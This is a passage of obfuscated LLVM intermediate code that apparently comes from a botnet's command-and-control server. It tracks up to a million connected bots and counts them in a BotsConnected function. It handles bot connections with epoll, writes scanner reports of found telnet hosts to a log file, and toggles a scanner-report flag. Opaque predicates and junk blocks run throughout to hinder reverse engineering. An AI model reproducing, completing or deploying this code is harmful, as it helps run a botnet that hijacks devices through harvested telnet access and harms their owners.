  %269 = load i32, i32* %11, align 4
  %270 = call i64 @send(i32 %269, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %271 = icmp eq i64 %270, -1
  %272 = load i32, i32* @x.5
  %273 = load i32, i32* @y.6
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %271, label %280, label %283

; <label>:280:                                    ; preds = %originalBBpart228
  %281 = load i32, i32* %11, align 4
  %282 = call i32 @close(i32 %281)
  br label %105

; <label>:283:                                    ; preds = %originalBBpart228
  %284 = load i32, i32* %11, align 4
  %285 = call i32 @close(i32 %284)
  br label %105

; <label>:286:                                    ; preds = %257
  %287 = load i32, i32* @x.5
  %288 = load i32, i32* @y.6
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %286
  %295 = load i32, i32* %11, align 4
  %296 = call i32 @make_socket_non_blocking(i32 %295)
  store i32 %296, i32* %6, align 4
  %297 = load i32, i32* %6, align 4
  %298 = icmp eq i32 %297, -1
  %299 = load i32, i32* @x.5
  %300 = load i32, i32* @y.6
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %298, label %307, label %310

; <label>:307:                                    ; preds = %originalBBpart232
  %308 = load i32, i32* %11, align 4
  %309 = call i32 @close(i32 %308)
  br label %362

; <label>:310:                                    ; preds = %originalBBpart232
  %311 = load i32, i32* @x.5
  %312 = load i32, i32* @y.6
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %310
  %319 = load i32, i32* %11, align 4
  %320 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %321 = bitcast %union.epoll_data* %320 to i32*
  store i32 %319, i32* %321, align 1
  %322 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %322, align 1
  %323 = load volatile i32, i32* @epollFD, align 4
  %324 = load i32, i32* %11, align 4
  %325 = call i32 @epoll_ctl(i32 %323, i32 1, i32 %324, %struct.epoll_event* %4) #7
  store i32 %325, i32* %6, align 4
  %326 = load i32, i32* %6, align 4
  %327 = icmp eq i32 %326, -1
  %328 = load i32, i32* @x.5
  %329 = load i32, i32* @y.6
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %327, label %336, label %339

; <label>:336:                                    ; preds = %originalBBpart236
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %337 = load i32, i32* %11, align 4
  %338 = call i32 @close(i32 %337)
  br label %362

; <label>:339:                                    ; preds = %originalBBpart236
  %340 = load i32, i32* @x.5
  %341 = load i32, i32* @y.6
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %339
  %348 = load i32, i32* %11, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %349
  %351 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %350, i32 0, i32 1
  store i8 1, i8* %351, align 4
  %352 = load i32, i32* %11, align 4
  %353 = call i64 @send(i32 %352, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  %354 = load i32, i32* @x.5
  %355 = load i32, i32* @y.6
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %105

; <label>:362:                                    ; preds = %336, %307, %135, %originalBBpart24
  %363 = load i32, i32* @x.5
  %364 = load i32, i32* @y.6
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %362
  %371 = load i32, i32* @x.5
  %372 = load i32, i32* @y.6
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %567

; <label>:379:                                    ; preds = %78
  %380 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %381 = load i32, i32* %8, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %380, i64 %382
  %384 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %383, i32 0, i32 1
  %385 = bitcast %union.epoll_data* %384 to i32*
  %386 = load i32, i32* %385, align 1
  store i32 %386, i32* %14, align 4
  %387 = load i32, i32* %14, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %388
  store %struct.clientdata_t* %389, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %390 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %391 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %390, i32 0, i32 1
  store i8 1, i8* %391, align 4
  br label %392

; <label>:392:                                    ; preds = %563, %379
  %393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %393, i8 0, i64 2048, i32 16, i1 false)
  br label %394

; <label>:394:                                    ; preds = %522, %521, %498, %490, %originalBBpart256, %452, %392
  %395 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %395, i8 0, i64 2048, i32 16, i1 false)
  %396 = icmp ne i8* %395, null
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %394
  %398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %399 = load i32, i32* %14, align 4
  %400 = call i32 @fdgets(i8* %398, i32 2048, i32 %399)
  %401 = sext i32 %400 to i64
  store i64 %401, i64* %17, align 8
  %402 = icmp sgt i64 %401, 0
  br label %403

; <label>:403:                                    ; preds = %397, %394
  %404 = phi i1 [ false, %394 ], [ %402, %397 ]
  %405 = load i32, i32* @x.5
  %406 = load i32, i32* @y.6
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %403
  %413 = load i32, i32* @x.5
  %414 = load i32, i32* @y.6
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %404, label %421, label %525

; <label>:421:                                    ; preds = %originalBBpart248
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %423 = call i8* @strstr(i8* %422, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %424 = icmp eq i8* %423, null
  br i1 %424, label %425, label %426

; <label>:425:                                    ; preds = %421
  store i32 1, i32* %16, align 4
  br label %525

; <label>:426:                                    ; preds = %421
  %427 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %427)
  %428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %429 = call i32 @strcmp(i8* %428, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %430 = icmp eq i32 %429, 0
  br i1 %430, label %431, label %453

; <label>:431:                                    ; preds = %426
  %432 = load i32, i32* @x.5
  %433 = load i32, i32* @y.6
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %431
  %440 = load i32, i32* %14, align 4
  %441 = call i64 @send(i32 %440, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %442 = icmp eq i64 %441, -1
  %443 = load i32, i32* @x.5
  %444 = load i32, i32* @y.6
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %442, label %451, label %452

; <label>:451:                                    ; preds = %originalBBpart252
  store i32 1, i32* %16, align 4
  br label %525

; <label>:452:                                    ; preds = %originalBBpart252
  br label %394

; <label>:453:                                    ; preds = %426
  %454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %455 = call i8* @strstr(i8* %454, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %456 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %457 = icmp eq i8* %455, %456
  br i1 %457, label %458, label %485

; <label>:458:                                    ; preds = %453
  %459 = load i32, i32* @x.5
  %460 = load i32, i32* @y.6
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %458
  %467 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %468 = call i8* @strstr(i8* %467, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %469 = getelementptr inbounds i8, i8* %468, i64 7
  store i8* %469, i8** %19, align 8
  %470 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %471 = load i8*, i8** %19, align 8
  %472 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %470, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %471)
  %473 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %474 = call i32 @fflush(%struct._IO_FILE* %473)
  %475 = load volatile i32, i32* @TELFound, align 4
  %476 = add nsw i32 %475, 1
  store volatile i32 %476, i32* @TELFound, align 4
  %477 = load i32, i32* @x.5
  %478 = load i32, i32* @y.6
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %394

; <label>:485:                                    ; preds = %453
  %486 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %487 = call i8* @strstr(i8* %486, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %488 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %489 = icmp eq i8* %487, %488
  br i1 %489, label %490, label %493

; <label>:490:                                    ; preds = %485
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %492 = call i8* @strstr(i8* %491, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %492, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %394

; <label>:493:                                    ; preds = %485
  %494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %495 = call i8* @strstr(i8* %494, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %496 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %497 = icmp eq i8* %495, %496
  br i1 %497, label %498, label %501

; <label>:498:                                    ; preds = %493
  %499 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %500 = call i8* @strstr(i8* %499, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %500, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %394

; <label>:501:                                    ; preds = %493
  %502 = load i32, i32* @x.5
  %503 = load i32, i32* @y.6
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %501
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %511 = call i32 @strcmp(i8* %510, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %512 = icmp eq i32 %511, 0
  %513 = load i32, i32* @x.5
  %514 = load i32, i32* @y.6
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %512, label %521, label %522

; <label>:521:                                    ; preds = %originalBBpart260
  br label %394

; <label>:522:                                    ; preds = %originalBBpart260
  %523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %524 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %523)
  br label %394

; <label>:525:                                    ; preds = %451, %425, %originalBBpart248
  %526 = load i64, i64* %17, align 8
  %527 = icmp eq i64 %526, -1
  br i1 %527, label %528, label %550

; <label>:528:                                    ; preds = %525
  %529 = call i32* @__errno_location() #9
  %530 = load i32, i32* %529, align 4
  %531 = icmp ne i32 %530, 11
  br i1 %531, label %532, label %533

; <label>:532:                                    ; preds = %528
  store i32 1, i32* %16, align 4
  br label %533

; <label>:533:                                    ; preds = %532, %528
  %534 = load i32, i32* @x.5
  %535 = load i32, i32* @y.6
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %533
  %542 = load i32, i32* @x.5
  %543 = load i32, i32* @y.6
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %564

; <label>:550:                                    ; preds = %525
  %551 = load i64, i64* %17, align 8
  %552 = icmp eq i64 %551, 0
  br i1 %552, label %553, label %554

; <label>:553:                                    ; preds = %550
  store i32 1, i32* %16, align 4
  br label %564

; <label>:554:                                    ; preds = %550
  br label %555

; <label>:555:                                    ; preds = %554
  %556 = load i32, i32* %16, align 4
  %557 = icmp ne i32 %556, 0
  br i1 %557, label %558, label %563

; <label>:558:                                    ; preds = %555
  %559 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %560 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %559, i32 0, i32 1
  store i8 0, i8* %560, align 4
  %561 = load i32, i32* %14, align 4
  %562 = call i32 @close(i32 %561)
  br label %563

; <label>:563:                                    ; preds = %558, %555
  br label %392

; <label>:564:                                    ; preds = %553, %originalBBpart264
  br label %565

; <label>:565:                                    ; preds = %564
  br label %566

; <label>:566:                                    ; preds = %565
  br label %567

; <label>:567:                                    ; preds = %566, %originalBBpart244, %59
  %568 = load i32, i32* @x.5
  %569 = load i32, i32* @y.6
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %567
  %576 = load i32, i32* %8, align 4
  %577 = add nsw i32 %576, 1
  store i32 %577, i32* %8, align 4
  %578 = load i32, i32* @x.5
  %579 = load i32, i32* @y.6
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBBpart280, label %originalBB66alteredBB

originalBBpart280:                                ; preds = %originalBB66
  br label %28

; <label>:586:                                    ; preds = %28
  br label %24
                                                  ; No predecessors!
  %588 = load i8*, i8** %2, align 8
  ret i8* %588

originalBBalteredBB:                              ; preds = %originalBB, %88
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %118
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %136
  %589 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %590 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %589, i32 0, i32 2
  %591 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %590, i32 0, i32 0
  %592 = load i32, i32* %591, align 2
  %593 = load i32, i32* %11, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %594
  %596 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %595, i32 0, i32 0
  store i32 %592, i32* %596, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %161
  %597 = load i32, i32* %12, align 4
  %598 = icmp slt i32 %597, 1000000
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %192
  %599 = load i32, i32* %12, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %600
  %602 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 8
  %604 = load i32, i32* %11, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %605
  %607 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %606, i32 0, i32 0
  %608 = load i32, i32* %607, align 8
  %609 = icmp eq i32 %603, %608
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %220
  store i32 1, i32* %13, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %237
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %260
  %610 = load i32, i32* %11, align 4
  %611 = call i64 @send(i32 %610, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %612 = icmp eq i64 %611, -1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %286
  %613 = load i32, i32* %11, align 4
  %614 = call i32 @make_socket_non_blocking(i32 %613)
  store i32 %614, i32* %6, align 4
  %615 = load i32, i32* %6, align 4
  %616 = icmp eq i32 %615, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %310
  %617 = load i32, i32* %11, align 4
  %618 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %619 = bitcast %union.epoll_data* %618 to i32*
  store i32 %617, i32* %619, align 1
  %620 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %620, align 1
  %621 = load volatile i32, i32* @epollFD, align 4
  %622 = load i32, i32* %11, align 4
  %623 = call i32 @epoll_ctl(i32 %621, i32 1, i32 %622, %struct.epoll_event* %4) #7
  store i32 %623, i32* %6, align 4
  %624 = load i32, i32* %6, align 4
  %625 = icmp eq i32 %624, -1
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %339
  %626 = load i32, i32* %11, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %627
  %629 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %628, i32 0, i32 1
  store i8 1, i8* %629, align 4
  %630 = load i32, i32* %11, align 4
  %631 = call i64 @send(i32 %630, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %362
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %403
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %431
  %632 = load i32, i32* %14, align 4
  %633 = call i64 @send(i32 %632, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %634 = icmp eq i64 %633, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %458
  %635 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %636 = call i8* @strstr(i8* %635, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %637 = getelementptr inbounds i8, i8* %636, i64 7
  store i8* %637, i8** %19, align 8
  %638 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %639 = load i8*, i8** %19, align 8
  %640 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %638, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %639)
  %641 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %642 = call i32 @fflush(%struct._IO_FILE* %641)
  %643 = load volatile i32, i32* @TELFound, align 4
  %644 = add nsw i32 %643, 1
  store volatile i32 %644, i32* @TELFound, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %501
  %645 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %646 = call i32 @strcmp(i8* %645, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %647 = icmp eq i32 %646, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %533
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %567
  %648 = load i32, i32* %8, align 4
  %_ = sub i32 0, %648
  %gen = add i32 %_, 1
  %_67 = sub i32 %648, 1
  %gen68 = mul i32 %_67, 1
  %_69 = sub i32 0, %648
  %gen70 = add i32 %_69, 1
  %_71 = sub i32 0, %648
  %gen72 = add i32 %_71, 1
  %_73 = sub i32 0, %648
  %gen74 = add i32 %_73, 1
  %_75 = sub i32 %648, 1
  %gen76 = mul i32 %_75, 1
  %_77 = sub i32 %648, 1
  %gen78 = mul i32 %_77, 1
  %649 = add nsw i32 %648, 1
  store i32 %649, i32* %8, align 4
  br label %originalBB66
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %21

; <label>:20:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

; <label>:21:                                     ; preds = %20, %19, %10
  %22 = load i32, i32* @x.7
  %23 = load i32, i32* @y.8
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %2, align 4
  %31 = load i32, i32* @x.7
  %32 = load i32, i32* @y.8
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %30

originalBBalteredBB:                              ; preds = %originalBB, %21
  %39 = load i32, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

; <label>:17:                                     ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
